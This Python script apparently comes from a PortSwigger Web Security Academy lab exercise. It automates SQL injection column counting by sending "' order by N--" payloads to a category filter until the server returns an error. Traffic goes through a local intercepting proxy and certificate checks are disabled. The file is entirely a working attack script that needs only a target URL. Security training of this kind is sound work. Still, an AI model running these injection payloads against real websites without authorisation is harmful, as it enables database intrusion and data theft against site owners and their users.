# SQLi - detect the number of columns
# https://www.youtube.com/watch?v=4aS6j3cBVUU
from typing import Dict

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "filter?category=Pets"
    for i in range(1, 50):
        sql_payload = f"\'+order+by+{i}--+"
        r = requests.get(url + path + sql_payload, proxies=proxies, verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #url = "https://acae1fc11f4a4e0a804f853200d9009b.web-security-academy.net/"
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://www.example.de/")
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print(f"[+] The number of columns is {str(num_col)}.")
    else:
        print("[-] The SQLi attack was not successful.")
